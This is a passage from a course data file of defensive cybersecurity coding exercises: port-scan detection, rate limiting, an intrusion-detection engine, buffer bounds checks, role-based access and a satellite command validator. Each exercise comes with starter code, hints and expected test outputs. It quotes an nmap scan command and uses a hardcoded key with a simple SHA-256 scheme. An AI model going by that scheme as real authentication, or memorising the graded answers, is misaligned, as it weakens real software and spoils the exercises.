(Trinity Uses Nmap)\n\nIn *The Matrix Reloaded*, Trinity needs to deactivate the city's power grid before Neo enters the building. She opens a computer terminal and types:\n~~~\nnmap -v -sS -O 10.0.0.1\n~~~\nUnlike most movies that use absurd fake Hollywood graphics, the directors used the real open-source network scanner **Nmap**! Trinity's scan reveals that port 22 (SSH) is running a vulnerable service (CRC32 exploit), which she uses to disable the power.\n\n## Your Task\n\nImplement ^detect_port_scanners(packets: list[dict], threshold: int = 3) -> list[str]^ in ^security.py^.\n- Each packet is a dictionary:\n  ^{ \"src_ip\": str, \"dst_ip\": str, \"dst_port\": int, \"proto\": str }^\n- Track the set of unique ^dst_port^ values queried by each ^src_ip^.\n- Return a sorted list of all source IP addresses that targeted $\\ge$ ^threshold^ unique ports.","starter":"def detect_port_scanners(packets: list[dict], threshold: int = 3) -> list[str]:\n    # TODO: Group packets by src_ip, count unique dst_ports, return sorted IPs >= threshold\n    return []\n","hint":"Use a dictionary mapping src_ip to a set() of destination ports. Return sorted list of IPs where len(ports) >= threshold.","terms":[{"term":"packet header","def":"The metadata at the beginning of a network packet containing source and destination addresses, port numbers, and protocol flags."},{"term":"port scan","def":"A technique where an attacker sends probes to multiple ports on a server to identify open services and vulnerable software."},{"term":"Nmap","def":"Network Mapper: a widely used open-source network security scanner for discovering hosts and services on a computer network."},{"term":"SYN scan","def":"A stealth port scan technique that sends TCP SYN packets without completing the three-way handshake."}],"image":{"url":"/diagrams/cybersecurity/packet-inspection.svg","caption":"Packet inspection analyzes source and destination headers. A single source IP querying multiple distinct ports in rapid succession triggers a port scan alert."},"isUnitTest":false,"fileName":"security.py","tests":[{"name":"Port Scan Detection in Packet Log","input":"","expected":"Scanners: ['198.51.100.4']"}],"usesInput":false,"hasHarness":true},{"id":"rate-limiting","number":"4.3","title":"Denial-of-Service Defense & Rate Limiting","content":"## The Nightclub Bouncer & The Velvet Rope\n\nImagine an exclusive nightclub that holds 100 people. A line of partygoers waits outside. \nIf an aggressive crowd of 500 people tries to rush through the front door at the exact same instant, the doorway jams, the door breaks, and nobody can enjoy the music. This is a **Denial-of-Service (DoS)** event.\n\nTo protect the venue, the nightclub stations a bouncer with a velvet rope and a click counter. The bouncer enforces a strict rule: **at most 5 people may pass every 10 seconds**. Anyone who attempts to enter after the limit is reached must wait outside until previous entries clear the window.\n\n## The Sliding Window Algorithm\n\nWeb servers and APIs protect themselves using **Rate Limiting**. When a malicious bot attempts to brute-force passwords by trying 1,000 guesses per second, the rate limiter shuts down the attack.\n\nIn the **Sliding Window** rate limiting algorithm:\n1. For each client IP, the server stores a list of timestamps of recent requests.\n2. When a new request arrives at time $T$:\n   - The server discards all timestamps older than $T - \\text{window\\_seconds}$.\n   - If the remaining request count is less than $\\text{max\\_requests}$, the request is **ALLOWED** and the current timestamp $T$ is recorded.\n   - If the count has reached $\\text{max\\_requests}$, the request is **BLOCKED** with HTTP status **429 Too Many Requests**.\n\n## Pop Culture: Ticketmaster & Silicon Valley\n\nIn the HBO comedy series *Silicon Valley*, the compression startup Pied Piper launches their platform and suddenly suffers a massive Distributed Denial of Service (DDoS) attack. The server rack (fondly named \"Anton\") begins overheating and catches fire because millions of requests hit the system without a rate limiter or firewall.\n\nIn real life, during the 2022 Taylor Swift \"Eras Tour\" ticket sale, over **3.5 billion bot requests** assaulted Ticketmaster's servers, causing the entire platform to crash. Modern applications must enforce strict sliding window rate limits on every public route.\n\n## Your Task\n\nImplement ^class SlidingWindowRateLimiter^ in ^security.py^:\n- ^__init__(max_requests: int = 5, window_seconds: float = 10.0)^\n- ^is_allowed(client_ip: str, current_time: float) -> tuple[bool, str]^:\n  - Prunes timestamps for ^client_ip^ older than ^current_time - window_seconds^.\n  - If ^len(timestamps) < max_requests^:\n    - Appends ^current_time^ to timestamps.\n    - Returns ^(True, \"200 OK\")^.\n  - If ^len(timestamps) >= max_requests^:\n    - Does NOT append timestamp.\n    - Returns ^(False, \"429 Too Many Requests\")^.","starter":"class SlidingWindowRateLimiter:\n    def __init__(self, max_requests: int = 5, window_seconds: float = 10.0):\n        # TODO: Initialize limits and timestamp store\n        pass\n\n    def is_allowed(self, client_ip: str, current_time: float) -> tuple[bool, str]:\n        # TODO: Prune expired timestamps, check limit, return (allowed, status)\n        return False, \"\"\n","hint":"Remove timestamps older than current_time - window_seconds. If remaining length < max_requests, append and return True, \"200 OK\".","terms":[{"term":"Denial of Service (DoS)","def":"A cyber attack aimed at rendering a computer or network unavailable to its intended users by overloading it with requests."},{"term":"rate limiting","def":"A defensive policy that controls the rate of incoming network traffic to prevent abuse and exhaustion of resources."},{"term":"sliding window","def":"A rate-limiting algorithm that measures request count across a continuously moving time window."},{"term":"HTTP 429","def":"The standard HTTP status code indicating \"Too Many Requests\"."}],"image":{"url":"/diagrams/cybersecurity/rate-limiting.svg","caption":"Sliding window rate limiting: maintains request timestamps over a 10-second window. Requests exceeding capacity are throttled with HTTP 429."},"isUnitTest":false,"fileName":"security.py","tests":[{"name":"Sliding Window Rate Limiter Timeline","input":"","expected":"Time 1.0s: True | 200 OK\nTime 2.0s: True | 200 OK\nTime 3.0s: True | 200 OK\nTime 4.0s: False | 429 Too Many Requests\nTime 7.0s: True | 200 OK"}],"usesInput":false,"hasHarness":true},{"id":"unit-4-test","number":"4.4","title":"Unit 4 Test: Intrusion Detection System (IDS) Engine","content":"## Cloudflare Network Defense Command Center\n\nThe Security Operations Center (SOC) is monitoring real-time telemetry from edge routers. A high-volume packet stream is arriving from multiple remote networks. \n\nAdversaries are coordinating multi-vector attacks:\n1. Compromised machines are sending packets from known **Command-and-Control (C2)** blacklisted IP addresses.\n2. Reconnaissance bots are conducting **port scans** to discover vulnerable services.\n3. Attacker nodes are attempting **traffic flooding** that violates sliding window rate limits.\n\nYou are tasked with building the unified ^IntrusionDetectionSystem^ alert engine!\n\n## IDS Processing Rules\n\nFor each incoming packet in ^packet_stream^:\n1. **Blacklist Check**:\n   If ^src_ip in self.blacklisted_ips^:\n   - Packet is **dropped**.\n   - Add alert: ^f\"C2_ALERT: Blacklisted IP {src_ip} dropped\"^ (record message once per IP).\n   - Continue to next packet.\n\n2. **Rate Limiting Check**:\n   Apply sliding window rate limiting per ^src_ip^ (using ^rate_limit^ and ^window^):\n   - If rate limit is exceeded: packet is **dropped**.\n   - Add alert: ^f\"DOS_ALERT: Rate limit exceeded by {src_ip}\"^ (record once per IP).\n   - Continue to next packet.\n\n3. **Port Scanning Reconnaissance**:\n   Track unique destination ports accessed by each ^src_ip^:\n   - If unique port count reaches or exceeds ^scan_threshold^:\n     - Add alert: ^f\"SCAN_ALERT: Port scan detected from {src_ip} ({count} ports)\"^ (record once per IP).\n\n4. **Pass**:\n   If the packet was not dropped, it is counted as **passed**.\n\n## Your Task\n\nImplement ^class IntrusionDetectionSystem^ in ^security.py^:\n- ^__init__(blacklisted_ips: set, scan_threshold: int = 3, rate_limit: int = 4, window: float = 10.0)^\n- ^analyze_traffic(packets: list[dict]) -> dict^ returning:\n  ^{ \"total_analyzed\": int, \"passed\": int, \"dropped\": int, \"alerts\": list[str] }^","starter":"class IntrusionDetectionSystem:\n    def __init__(self, blacklisted_ips: set, scan_threshold: int = 3, rate_limit: int = 4, window: float = 10.0):\n        # TODO: Store configuration\n        pass\n\n    def analyze_traffic(self, packets: list[dict]) -> dict:\n        # TODO: Process packets, enforce blacklist, rate limit, and port scan detection\n        return {}\n","hint":"First check if src_ip is blacklisted. If not, apply sliding window rate limit. Then track unique ports and alert if >= scan_threshold.","terms":[{"term":"Intrusion Detection System (IDS)","def":"A defensive device or application that monitors network or system activities for malicious activities or policy violations."},{"term":"Command and Control (C2)","def":"Centralized servers used by cybercriminals to maintain communications with and control compromised computers."}],"image":{"url":"/diagrams/cybersecurity/unit-4-test.svg","caption":"The Intrusion Detection System alert engine correlates C2 blacklist feeds, port scan reconnaissance, and sliding window DoS surges."},"isUnitTest":true,"fileName":"security.py","tests":[{"name":"Real-Time IDS Incident Detection","input":"","expected":"Total: 8 | Passed: 6 | Dropped: 2\nAlert: C2_ALERT: Blacklisted IP 198.51.100.99 dropped\nAlert: SCAN_ALERT: Port scan detected from 10.0.0.2 (3 ports)\nAlert: DOS_ALERT: Rate limit exceeded by 10.0.0.1"}],"usesInput":false,"hasHarness":true}]},{"id":"secure-software","title":"Secure Software & Defensive Engineering","lessons":[{"id":"buffer-overflow-defense","number":"5.1","title":"Buffer Overflow & Safe Memory Boundaries","content":"## Pouring Coffee into an 8-Ounce Mug\n\nImagine holding an 8-ounce ceramic coffee mug. You tilt a 16-ounce glass carafe and pour continuously. \n\nWhat happens? The coffee reaches the brim, spills over the ceramic edges, puddles across your desk, and ruins your expensive laptop.\n\nIn computer systems programming (such as C, C++, or assembly), a **buffer** is a contiguous block of reserved memory—like that 8-ounce mug. When a program reads network input or user input into a buffer using unsafe functions (such as ^gets()^ or ^strcpy()^) without checking the length, excess bytes spill over into neighboring memory locations.\n\n## The Return Instruction Pointer Hijack\n\nWhy is a buffer overflow so devastating?\nOn the computer's execution stack, right next to your local buffer sits the **Return Instruction Pointer (EIP/RIP)**. The return pointer tells the CPU what line of code to execute next when a function finishes.\n\nWhen an attacker sends an oversized payload, the spillover overwrites the return pointer with their own address! When the function returns, instead of continuing normal execution, the CPU jumps directly into the attacker's injected **shellcode**, giving the attacker full remote control of the machine.\n\n## Pop Culture: The Morris Worm (1988)\n\nOn the evening of November 2, 1988, Cornell graduate student Robert Tappan Morris released a program intended to gauge the size of the internet. The worm exploited an unvalidated buffer in the UNIX ^fingerd^ service (which used the dangerous C function ^gets()^ without bounds checking). \n\nBecause of a coding mistake, the worm infected computers multiple times, overloading machines across NASA, MIT, Stanford, and the Pentagon. It crashed approximately 10% of the entire global internet—all caused by a missing buffer boundary check!\n\n## Defensive Bounds Checking\n\nIn defensive software engineering, you must enforce strict boundary checks before any byte write occurs. If an incoming payload exceeds capacity, the system must immediately reject the operation and record a security incident.\n\n## Your Task\n\nImplement ^class SafeMemoryBuffer^ in ^security.py^:\n- ^__init__(capacity: int)^:\n  - Stores ^self.capacity = capacity^.\n  - Initializes ^self.buffer = b\"\"^.\n- ^write(data: bytes) -> tuple[bool, str]^:\n  - If ^len(data) > self.capacity^:\n    - Do NOT modify ^self.buffer^!\n    - Return: ^(False, f\"BUFFER_OVERFLOW_BLOCKED: {len(data)}B exceeds {self.capacity}B\")^\n  - If ^len(data) <= self.capacity^:\n    - Sets ^self.buffer = data^.\n    - Return: ^(True, f\"SUCCESS: {len(data)}B written safely\")^\n- ^read() -> bytes^:\n  - Returns ^self.buffer^.","starter":"class SafeMemoryBuffer:\n    def __init__(self, capacity: int):\n        # TODO: Initialize capacity and internal storage\n        pass\n\n    def write(self, data: bytes) -> tuple[bool, str]:\n        # TODO: Check bounds. Reject if oversized; otherwise store and return success.\n        return False, \"\"\n\n    def read() -> bytes:\n        # TODO: Return stored bytes\n        return b\"\"\n","hint":"If len(data) > self.capacity, return False and the exact error string. Do not alter self.buffer.","terms":[{"term":"buffer","def":"A contiguous region of physical memory used to hold data while it is being moved from one place to another."},{"term":"buffer overflow","def":"An anomaly where a program, while writing data to a buffer, overruns the boundary and overwrites adjacent memory."},{"term":"instruction pointer","def":"A CPU register that points to the next memory address of instructions to be executed."},{"term":"shellcode","def":"A small piece of code used as the payload in the exploitation of a software vulnerability."},{"term":"bounds checking","def":"A defensive programming practice that tests whether an index or size is within legal boundaries before accessing memory."}],"image":{"url":"/diagrams/cybersecurity/buffer-overflow-defense.svg","caption":"Buffer Overflow: Pouring 16 bytes into an 8-byte buffer overwrites adjacent memory and the instruction return pointer. Bounds checking prevents memory corruption."},"isUnitTest":false,"fileName":"security.py","tests":[{"name":"Safe Memory Boundary Verification","input":"","expected":"Write HELLO: True | SUCCESS: 5B written safely\nWrite OVERFLOW_12345: False | BUFFER_OVERFLOW_BLOCKED: 14B exceeds 8B\nWrite SAFE_OK!: True | SUCCESS: 8B written safely\nFinal Buffer Content: SAFE_OK!"}],"usesInput":false,"hasHarness":true},{"id":"least-privilege","number":"5.2","title":"Principle of Least Privilege & Role-Based Access Control","content":"## The Hotel Keycard & The Master Key\n\nWhen you check into a hotel, the front desk gives you a magnetic plastic keycard. That keycard opens the door to room 304 and unlocks the fitness center door. \n\nDoes that keycard open the manager's office? No. Does it open the security camera server room? No. Does it unlock room 305 next door? No!\n\nIf the hotel gave every single guest a master skeleton key that unlocked every door in the building, a single lost card would endanger every guest's life and property.\n\nThis is the **Principle of Least Privilege (PoLP)**:\n> *\"Every program, process, and user of the system should operate using the least set of privileges necessary to complete the job.\"*\n\n## Role-Based Access Control (RBAC)\n\nIn modern cybersecurity architectures, we implement least privilege using **Role-Based Access Control (RBAC)**:\n- **GUEST**: Can only read public announcements.\n- **OPERATOR**: Can read logs, write telemetry, and view telemetry metrics.\n- **ADMIN**: Can manage users, reboot servers, and deploy code updates.\n\nBy locking down permissions by default, even if an attacker compromises a service or account running with a lower role, they cannot immediately compromise the entire infrastructure.\n\n## Pop Culture: Jurassic Park & Dennis Nedry\n\nIn Steven Spielberg's *Jurassic Park*, lead programmer Dennis Nedry (Wayne Knight) had unchecked, monopolistic superuser access over the island's entire computer network. Because the park had no segregation of duties or least privilege enforcement, Nedry was able to deactivate the electric fences, kill the phone lines, and lock the park's chief engineer out of the system:\n*\"Ah ah ah! You didn't say the magic word!\"*\n\nHad John Hammond implemented least privilege, a single developer could never have taken down the physical safety systems of the dinosaur enclosures!\n\n## Your Task\n\nImplement ^class RoleAccessControl^ in ^security.py^:\n- Roles & allowed permission sets:\n  - ^\"GUEST\"^: ^{\"read_public\"}^\n  - ^\"OPERATOR\"^: ^{\"read_public\", \"read_logs\", \"write_telemetry\"}^\n  - ^\"ADMIN\"^: ^{\"read_public\", \"read_logs\", \"write_telemetry\", \"reboot_system\", \"manage_roles\"}^\n- Method ^authorize(user_role: str, action: str) -> tuple[bool, str]^:\n  - If ^user_role^ is not in the recognized roles:\n    - Return: ^(False, f\"DENIED: Unknown role {user_role}\")^\n  - If ^action^ is permitted for ^user_role^:\n    - Return: ^(True, f\"GRANTED: {action} permitted for {user_role}\")^\n  - Otherwise:\n    - Return: ^(False, f\"DENIED: {action} requires higher privilege than {user_role}\")^","starter":"class RoleAccessControl:\n    # TODO: Define roles and permissions\n    def authorize(self, user_role: str, action: str) -> tuple[bool, str]:\n        # TODO: Check role existence and permission membership\n        return False, \"\"\n","hint":"Check if user_role in self.ROLES. Then check if action in self.ROLES[user_role].","terms":[{"term":"Principle of Least Privilege (PoLP)","def":"The practice of limiting access rights for users to the bare minimum permissions needed to perform their work."},{"term":"Role-Based Access Control (RBAC)","def":"An approach to restricting system access to authorized users based on their assigned organizational roles."},{"term":"privilege escalation","def":"An attack technique where a threat actor exploits a bug or configuration error to gain higher access levels than authorized."}],"image":{"url":"/diagrams/cybersecurity/least-privilege.svg","caption":"The Principle of Least Privilege (PoLP): Users and services are granted only the minimum permissions necessary to perform their legitimate roles."},"isUnitTest":false,"fileName":"security.py","tests":[{"name":"RBAC Access Authorization Matrix","input":"","expected":"Auth(GUEST, read_public): True | GRANTED: read_public permitted for GUEST\nAuth(GUEST, reboot_system): False | DENIED: reboot_system requires higher privilege than GUEST\nAuth(OPERATOR, write_telemetry): True | GRANTED: write_telemetry permitted for OPERATOR\nAuth(OPERATOR, manage_roles): False | DENIED: manage_roles requires higher privilege than OPERATOR\nAuth(ADMIN, reboot_system): True | GRANTED: reboot_system permitted for ADMIN\nAuth(HACKER, read_public): False | DENIED: Unknown role HACKER"}],"usesInput":false,"hasHarness":true},{"id":"unit-5-test","number":"5.3","title":"Unit 5 Capstone: Autonomous Satellite Defense Shield","content":"## Mission Briefing: Orbital Defense Satellite Aegis-1\n\nThe autonomous orbital defense satellite **Aegis-1** travels in low Earth orbit at 17,500 mph. It communicates with international ground telemetry stations via radio frequencies. \n\nRogue nation-state threat actors are attempting to hijack the satellite's orbital thrusters. They are sending forged packets across ground stations, attempting buffer overflows on packet telemetry buffers, and forging authentication signatures.\n\nYou are the Lead Cybersecurity Flight Director. Your capstone mission: implement the complete ^SatelliteDefenseShield^ packet validation engine to protect the satellite from being hijacked!\n\n## Pop Culture: GoldenEye & Interstellar\n\nIn the James Bond thriller *GoldenEye*, rogue agents hijack the Soviet GoldenEye space weapon by compromising ground terminal authorization keys. In *Interstellar*, the robotic co-pilot TARS refuses to obey commands that violate security parameter constraints.\n\nAegis-1 requires uncompromising, multi-layer defensive verification.\n\n## The 5-Stage Defense Shield Pipeline\n\nEvery received packet is a dictionary:\n^{ \"station_id\": str, \"role\": str, \"command\": str, \"payload\": str, \"auth_hash\": str }^\n\nYour shield must enforce five sequential checkpoints:\n\n1. **Check 1: Blacklist Verification**:\n   If ^station_id in {\"ROGUE_STATION_9\", \"UNKNOWN_SAT_X\"}^:\n   - Return: ^{ \"status\": \"DROPPED\", \"reason\": \"BLACKLISTED_STATION\" }^\n\n2. **Check 2: Role-Based Access Control (RBAC)**:\n   Authorized commands per role:\n   - ^\"ANALYST\"^: ^{\"GET_TELEMETRY\", \"PING\"}^\n   - ^\"ENGINEER\"^: ^{\"GET_TELEMETRY\", \"PING\", \"ADJUST_SOLAR_PANELS\"}^\n   - ^\"COMMANDER\"^: ^{\"GET_TELEMETRY\", \"PING\", \"ADJUST_SOLAR_PANELS\", \"ORBITAL_BURN\", \"DEPLOY_PAYLOAD\"}^\n   If ^role^ is unrecognized or ^command^ is not in that role's permissions:\n   - Return: ^{ \"status\": \"DROPPED\", \"reason\": \"UNAUTHORIZED_ROLE_COMMAND\" }^\n\n3. **Check 3: Buffer Overflow Defense**:\n   Payloads are stored in a fixed 32-byte hardware register.\n   If ^len(payload.encode('utf-8')) > 32^:\n   - Return: ^{ \"status\": \"DROPPED\", \"reason\": \"BUFFER_OVERFLOW_ATTEMPT\" }^\n\n4. **Check 4: Cryptographic Authenticity**:\n   Satellite secret key: ^SECRET_KEY = \"AEGIS_TOP_SECRET_SALT_2026\"^\n   Calculate expected hash:\n   ^expected_hash = hashlib.sha256(f\"{station_id}:{command}:{payload}:{SECRET_KEY}\".encode('utf-8')).hexdigest()^\n   If ^auth_hash != expected_hash^:\n   - Return: ^{ \"status\": \"DROPPED\", \"reason\": \"INVALID_AUTH_HASH\" }^\n\n5. **Check 5: Command Execution**:\n   If all four defensive checks pass:\n   - Return: ^{ \"status\": \"EXECUTED\", \"station_id\": station_id, \"command\": command, \"payload\": payload }^\n\n## Your Task\n\nImplement ^class SatelliteDefenseShield^ in ^security.py^ with method ^process_command_packet(packet: dict) -> dict^.","starter":"import hashlib\n\nSECRET_KEY = \"AEGIS_TOP_SECRET_SALT_2026\"\n\nclass SatelliteDefenseShield:\n    def process_command_packet(self, packet: dict) -> dict:\n        # TODO: Implement 5-stage verification (Blacklist, RBAC, Buffer Check, SHA-256 Hash, Execute)\n        return {\"status\": \"DROPPED\"}\n","hint":"Run the 5 checks in order: Blacklist -> RBAC -> Buffer len <= 32 -> SHA-256 hash match -> Return EXECUTED.","terms":[{"term":"cryptographic signature","def":"A mathematical mechanism that proves the authenticity and integrity of a digital message or command."},{"term":"defense-in-depth","def":"An information assurance strategy integrating multiple layers of defense throughout an IT system."},{"term":"HMAC / signed digest","def":"A specific type of message authentication code involving a cryptographic hash function and a secret key."},{"term":"secure architecture","def":"A system design where defensive mechanisms fail safely and grant zero trust to incoming input."}],"image":{"url":"/diagrams/cybersecurity/unit-5-test.svg","caption":"The Aegis-1 Orbital Satellite Defense Shield: integrates C2 blacklists, role authorization, buffer limits, and SHA-256 cryptographic packet signing."},"isUnitTest":true,"fileName":"security.py","tests":[{"name":"Satellite Defense Shield Verification Suite","input":"","expected":"Packet from NASA_HOUSTON [ORBITAL_BURN]: EXECUTED | ORBITAL_BURN\nPacket from ROGUE_STATION_9 [PING]: DROPPED | BLACKLISTED_STATION\nPacket from ESA_DARMSTADT [ORBITAL_BURN]: DROPPED | UNAUTHORIZED_ROLE_COMMAND\nPacket from NASA_HOUSTON [ORBITAL_BURN]: DROPPED | BUFFER_OVERFLOW_ATTEMPT\nPacket from NASA_HOUSTON [ORBITAL_BURN]: DROPPED | INVALID_AUTH_HASH"}],"usesInput":false,"hasHarness":true}]}]}];
